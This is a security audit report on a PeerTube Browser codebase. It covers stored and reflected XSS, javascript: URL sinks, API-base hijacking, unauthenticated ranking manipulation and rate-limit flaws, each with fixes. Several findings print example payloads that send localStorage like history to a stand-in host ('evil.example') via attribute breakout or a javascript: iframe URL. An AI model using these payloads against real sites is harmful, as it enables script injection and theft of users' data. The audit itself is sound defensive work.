# Security audit — PeerTube Browser (run-1)

Scope: entire repository except `.un/` and `src/un/`. Source-first review; nothing was
executed against a running instance (no built dataset, no browser available), so
browser-behaviour claims are argued from the HTML spec and cited as such.

## Executive summary

The server side is in better shape than the client side. Every SQL statement in the
Engine and Client backends is parameterized, the one dynamic `ORDER BY` fragment is
whitelisted, no subprocess call uses a shell, request bodies are size-capped, and the
Engine binds loopback. The exploitable weaknesses are concentrated in one place: the
frontend renders content that originates from **arbitrary third-party PeerTube
instances** using hand-rolled escaping, and it takes several URL parameters straight
into DOM URL sinks. One of those renders is not escaped at all, which gives a
third-party instance operator stored XSS against every visitor of the channels page.
There is no CSP, so nothing catches an escaping mistake. The second theme is that the
application has no notion of identity: the "user profile" and event-ingest endpoints
are fully anonymous and unauthenticated, which lets anyone rewrite the global
recommendation ranking and wipe the shared profile. That is partly by design (there
are no accounts), but the ranking-manipulation path has real consequences for every
user of a deployment.

Coverage caveat: a single audit run explores a subset of paths. This is run 1 for this
repository; re-running the audit will likely surface findings this pass missed,
especially in the batch/updater jobs and the crawler, which got lighter treatment than
the request-handling paths.

## Baseline

Compared against PeerTube's own web client and other federated-content aggregators.
Those treat every string from a remote instance as hostile: contextual auto-escaping
(Angular), description sanitization, and URL-scheme allowlists before binding to
`href`. PeerTube has had XSS advisories in exactly this class, which is why its current
client validates schemes. This project accepts the opposite default — remote strings
are stored raw and re-emitted into HTML — and adds no CSP as a backstop. That makes
F1/F3 stronger findings, not weaker ones.

## Findings

| ID | Severity | Title |
|---|---|---|
| F1 | HIGH | Stored XSS on the channels page: `channel_url` interpolated into an `href` attribute without escaping |
| F2 | HIGH | Reflected XSS on the video page: `?embed=` is assigned to an unsandboxed iframe `src` |
| F3 | MEDIUM | `javascript:` URLs reach `href` sinks from crawled instance data and from URL parameters |
| F4 | MEDIUM | `?api=` overrides the API base in production builds, redirecting feed traffic and the user's like history to an attacker-chosen origin |
| F5 | MEDIUM | Unauthenticated global ranking manipulation and unbounded table growth via `/client/events/publish` |
| F6 | MEDIUM | Client-backend rate limiter keys on the TCP peer address; behind the documented reverse proxy all users share one bucket (Engine has the mirror-image bug) |
| F7 | LOW | No identity on the profile API: any visitor can read or wipe the shared server-side like history |
| F8 | LOW | Request amplification: one `/api/user-profile/likes` call triggers up to 200 sequential Engine round-trips |

---

### F1 — HIGH — Stored XSS on the channels page via unescaped `channel_url`

**Location:** `client/frontend/src/pages/channels/index.ts:277` (sink);
`engine/crawler/src/channels-worker.ts:323` (source).

Every other interpolation in `renderTable` runs through `escapeHtml`. This one does
not:

```ts
<a class="channel-name" href="${url}" target="_blank" rel="noreferrer">${escapeHtml(label)}</a>
```

`url` is `channelUrl(row)` → `row.channel_url`, which the crawler stores verbatim from
the remote instance's `/api/v1/video-channels` response (`toNullableString(channel.url)`,
no scheme or character validation — `channels-worker.ts:516`). It travels unmodified
through `fetch_channels` (`engine/server/data/channels.py:133`), the Engine
`/api/channels` handler, and the Client gateway proxy into the page.

**Attack:** an operator of a PeerTube-compatible instance listed on
`instances.joinpeertube.org` (self-registration; the sync job pulls that list at
`engine/server/db/jobs/sync-whitelist.py:29`) sets a channel's `url` to
`x" onmouseover="fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))" data-x="`.
After the next crawl, anyone who opens `/channels.html` and moves the pointer over that
row executes the attacker's script. Injecting `"><img src=x onerror=...>` fires with no
interaction at all.

**Impact:** arbitrary JavaScript in the application origin for every visitor of the
channels page — exfiltration of the like history from `localStorage`, forged
`/api/user-action` and `/api/user-profile/reset` calls, and full page rewrite
(phishing). No CSP limits it.

**Fix:** escape it, and validate the scheme:

```ts
const safeUrl = /^https?:\/\//i.test(url) ? url : "#";
`<a class="channel-name" href="${escapeHtml(safeUrl)}" ...>`
```

Better: reject non-`http(s)` `channel.url` at crawl time in `toVideoRow`/`crawlInstanceChannels`.

---

### F2 — HIGH — Reflected XSS: `?embed=` assigned to an unsandboxed iframe `src`

**Location:** `client/frontend/src/pages/video-page/index.ts:45` (source),
`:200` (sink); `client/frontend/video-page.html:25` (the iframe, no `sandbox`).

`fallback.embed = params.get("embed")` is used as the player URL whenever the metadata
fetch returns `null`, and `loadVideo` assigns it directly: `embedEl.src = embed`. No
scheme check. `fetchVideoMetadata` returns `null` whenever `resolveVideoSource()` cannot
produce both a host and an id (`:344`, `:535`), which is exactly what happens when the
link carries only an `embed` parameter.

**Attack:** send a victim
`https://<site>/video-page.html?embed=javascript:fetch('https://evil.example/?l='%2BlocalStorage.getItem('localLikes:v1'))`.
Navigating an iframe to a `javascript:` URL executes the script in the origin of the
document that initiated the navigation, because the iframe's initial `about:blank`
inherits the parent's origin and the HTML spec's `javascript:` URL handling only
proceeds when the initiator is same origin-domain with the target's active document.
Here the initiator is the page itself, so it proceeds. The iframe has no `sandbox`
attribute, and there is no CSP `frame-src`/`script-src` to block it.

**Impact:** same as F1, but zero-click and reachable through a plain link (no crawler
access needed).

**Confidence note:** this rests on documented browser behaviour for `javascript:` in
iframe `src`, not on an executed proof of concept — no browser was available in this
environment. The absence of `sandbox` and CSP was verified in the source.

**Fix:** allowlist the scheme before assignment:

```ts
if (embedEl && /^https:\/\//i.test(embed)) embedEl.src = embed;
```

and add `sandbox="allow-scripts allow-same-origin allow-fullscreen"` (or narrower) to
the iframe.

---

### F3 — MEDIUM — `javascript:` URLs reach `href` sinks

**Locations:**
`client/frontend/src/pages/video-page/index.ts:110` (channel link),
`:159` (account link), `:204` (original-video link);
`client/frontend/src/pages/videos/index.ts:364` (channel link on cards).

These are `escapeHtml`'d, so there is no attribute breakout, but `escapeHtml` does not
touch the URL scheme. `javascript:alert(1)` survives it intact. The values come from
two places: crawled instance data (`channel_url` / `video_url` stored raw at
`engine/crawler/src/videos-worker.ts:658` and `:660`, and both present in the response
projection `STABLE_VIDEO_FIELDS` at `engine/server/api/handlers/similar.py:74,77`) and,
on the video page, the `channelUrl` / `url` query parameters
(`video-page/index.ts:44`, `:46`).

**Attack:** either a malicious listed instance sets `channel.url` to a `javascript:`
URI, or the attacker sends a direct link
`?channel=Official&channelUrl=javascript:...`. The victim clicks the channel name and
the script runs in the application origin.

**Impact:** same primitives as F1 but gated on a click, which is why this is MEDIUM
rather than HIGH.

**Fix:** one shared `safeExternalUrl(value)` helper that returns `"#"` for anything not
matching `^https?:` and use it at every `href`/`src` assignment in the three page
modules.

---

### F4 — MEDIUM — `?api=` redirects API traffic and the like history to an attacker origin

**Location:** `client/frontend/src/data/api-base.ts:10-27`,
`client/frontend/src/data/videos.ts:29,38,45`.

`resolveClientApiBase` accepts any value starting with the literal `http` as the API
base. In development the Vite build injects `VITE_CLIENT_API_BASE`, which takes
precedence; in a production build made per `DEPLOYMENT.md` that variable is unset, so
the `?api=` URL parameter wins. `fetchSimilarVideosPayload` then POSTs the user's stored
likes to the attacker's host (`videos.ts:77-86`) and renders whatever rows come back.

**Attack:** `https://<site>/videos.html?api=http://evil.example` — the attacker
receives the visitor's like history and controls every field of every rendered card,
which also hands them the `href` sinks of F3 on a page the victim believes is the real
site. Note `videoPageUrl` propagates `api` into every card link (`videos/index.ts:405`),
so the override is sticky across navigation.

**Impact:** privacy loss (viewing history) plus attacker-controlled page content on the
real origin.

**Fix:** drop the parameter in production builds — only honour `?api=` when
`import.meta.env.DEV`, or allowlist the permitted origins.

---

### F5 — MEDIUM — Unauthenticated global ranking manipulation via `/client/events/publish`

**Locations:** `client/backend/server.py:245`, `:652` (`_handle_client_publish_event`);
`engine/server/api/handlers/internal_events.py:10`;
`engine/server/data/interaction_events.py:48`;
`engine/server/data/random_videos.py:247` (where the injected score is used).

`_handle_client_publish_event` accepts any JSON object from any browser, fills in a
fresh `event_id` when one is absent — which defeats the ingest layer's idempotency key
— and forwards it to the Engine's bridge ingest. The Engine validates only that
`event_type` is in `{Like, UndoLike, Comment}` and that `object.video_uuid` and
`object.instance_domain` are non-empty strings. It then adds `+1.0` to
`interaction_signals.signal_score` for that video, and the popular-video query orders by
`(v.popularity + COALESCE(sig.signal_score, 0)) DESC`.

**Attack:**

```
POST /client/events/publish
{"event_type":"Like","actor_id":"x","object":{"video_uuid":"<target>","instance_domain":"<host>"}}
```

repeated. Typical `popularity` values are two to three digits (`views + 2*likes`
divided by an age factor — `engine/server/data/popularity.py:24`), so a few thousand
posts put any chosen video at the top of the global popular pool. That pool supplies
10 % of the signed-in-style home feed and 20–40 % of the guest feed
(`engine/server/api/server_config.py:56,142`). Each post also inserts a permanent row
into `interaction_raw_events`, which has no retention policy.

**Impact:** any anonymous party sets what every visitor of the deployment sees in the
"popular" slots — spam, scam or malware promotion — and grows the Engine database
without bound.

**Fix:** authenticate the Client→Engine bridge (shared secret or Unix socket) instead
of exposing a browser-facing passthrough; require the client to derive `event_id`
deterministically from `(actor, video, type)` so replays collapse; rate-limit
per-video signal accumulation and cap `signal_score`'s influence on ranking.

---

### F6 — MEDIUM — Rate limiting keys on the wrong address at both ends

**Locations:** `client/backend/server.py:253-257` (`_rate_limit_check`, uses
`self.client_address[0]`); `engine/server/api/handlers/similar.py:355-362` (uses
`_get_client_ip`, which trusts `X-Forwarded-For`).

Both services parse `X-Forwarded-For`/`X-Real-IP` (`client/backend/server.py:135`,
`handlers/similar.py:215`), so a reverse proxy is the intended deployment. The Client
backend then ignores that header for rate limiting and buckets on the TCP peer, which
behind a proxy is the proxy itself: **one shared bucket of 90 requests/minute per path
for the entire user base**. A single client issuing 90 requests a minute to
`/recommendations` returns HTTP 429 to everyone else. The Engine has the opposite bug —
it keys on the spoofable header, so a rotating `X-Forwarded-For` bypasses its limiter
entirely.

**Impact:** trivial denial of service against all users of a proxied deployment; loss of
the only abuse control in front of F5 and F8.

**Fix:** parse `X-Forwarded-For` for the limiter key only when the peer is a configured
trusted proxy, and use the peer address otherwise. Apply the same helper in both
services.

---

### F7 — LOW — Anonymous read and reset of the shared profile

**Location:** `client/backend/server.py:200-216`, `:233-238`, `:604`;
`client/backend/lib/http_utils.py:33`.

`resolve_user_id` returns whatever string the caller supplies and falls back to
`"local-user"`. The frontend never sends `user_id`, so every visitor's likes recorded
through `/api/user-action` land in that one row. `GET /api/user-profile` returns it and
`POST /api/user-profile/reset` deletes it, both unauthenticated; supplying an arbitrary
`user_id` reads or wipes any other profile that exists.

**Impact:** limited — the data is video ids and instance hostnames for the deployment as
a whole, and the frontend's personalization actually runs off `localStorage`, so the
server-side profile is largely vestigial. Still, it is cross-visitor data that any
visitor can read and destroy.

**Fix:** if server-side profiles are to stay, bind them to a signed httpOnly cookie
issued by the backend; otherwise remove the endpoints and the users DB.

---

### F8 — LOW — Request amplification in `/api/user-profile/likes`

**Location:** `client/backend/server.py:633` → `client/backend/lib/engine_api_client.py:95`.

`resolve_videos_by_uuid_host` loops over up to `MAX_CLIENT_LIKES` (200) submitted
entries and issues one sequential HTTP POST to the Engine per entry, each taking the
Engine's `db_lock`. One request costs 200 round-trips; the rate limiter permits 90 such
requests per minute (and per F6 that budget is shared, not per-user). On a threaded
`http.server` this is a cheap way to saturate the Engine.

**Fix:** batch the resolve into a single Engine call (the metadata endpoint already
accepts a batch), and lower the per-request entry cap.

---

## Hardening notes (not findings)

- **No Content-Security-Policy anywhere** — no `<meta http-equiv>` in any page, no
  header set by either backend. A CSP with `script-src 'self'` would have blunted F1,
  F2 and F3. This is the single highest-value hardening change.
- `access-control-allow-origin: *` on the Client backend's write endpoints
  (`client/backend/lib/http_utils.py:47`). Harmless today only because there is no
  authentication to abuse; it becomes a CSRF problem the moment cookies are added.
- `RECOMMENDATIONS_DEBUG_ENABLED = True` by default
  (`engine/server/api/server_config.py:338`) exposes per-row scoring internals to anyone
  passing `debug=1`. Non-secret, but it is a production default that should be off.
- `/api/video` performs up to two outbound HTTPS requests to a third-party instance per
  inbound request (`engine/server/api/handlers/video.py:227`), with no cache gate — an
  amplification vector against instances.
- The crawler follows redirects (`--location` in `engine/crawler/src/http.ts:144`, and
  `fetch` default), so a crawled instance can steer requests at internal addresses. The
  parsed result is heavily filtered before storage, but an egress allowlist or
  redirect-target check would close the class.
- `interaction_raw_events` has no retention or pruning (`interaction_events.py:18`).
- Moderation filters apply only to feed/similar responses
  (`data/serving_moderation.py:14`); `/api/video` and `/api/channels` return
  denylisted instances and blocked channels. `DEFAULT_HIDE_BLOCKED_IN_VIDEO_API = False`
  shows this is deliberate, but it means the blocklist is not a containment boundary.
- The updater lock path `/tmp/peertube-browser-staging-sync.lock`
  (`engine/server/db/jobs/updater-worker.py:98`) is predictable and world-writable in
  location. `O_CREAT|O_EXCL` blocks the symlink attack, but a local user can pre-create
  it with a live PID and stall the updater indefinitely.
- Engine `_resolve_client_likes` (`handlers/similar.py:178`) builds one `OR` term per
  submitted like with no count cap on `/videos/similar` (only `/recommendations` is
  capped at 5). A 64 KB body yields ~2 700 terms in a single statement — wasted CPU and
  a likely SQLite parser error surfaced as a 500.
- Unhandled exceptions are returned to the caller as `{"error": str(exc)}`
  (`handlers/similar.py:776`, `client/backend/server.py:484`), which can leak internal
  paths and identifiers.

## What this codebase does well

- **Every** SQL statement in both services is parameterized, including the batch
  `IN (...)` constructions. The one dynamic `ORDER BY` is resolved through a fixed
  dictionary with a safe default and a direction allowlist
  (`engine/server/data/channels.py:9-18,56-59`) — this is the correct pattern and it is
  applied consistently.
- No `shell=True`, no string-built commands; `subprocess` and `execFile` are always
  called with argument lists. No `eval`, no `pickle`, no dynamic import.
- Request bodies are length-capped before reading (`http_utils.read_json_body`), the
  Engine caps recommendation bodies at 64 KB, and the proxy caps its own outbound body.
- The Client gateway allowlists query parameters and body keys per route and rejects
  unknown ones outright (`client/backend/server.py:48-67,261-308`) — a genuinely good
  pattern that prevented several parameter-smuggling ideas during this audit.
- The Engine binds loopback by default and the systemd unit runs as a non-root user
  with no privilege escalation (`engine/install-engine-service.sh:178`).
- Service name and port arguments in the installers are validated before being written
  into unit files.
- The Engine/Client boundary is enforced by checked-in contract tests
  (`tests/check-client-engine-boundary.sh`, `tests/check-frontend-client-gateway.sh`).
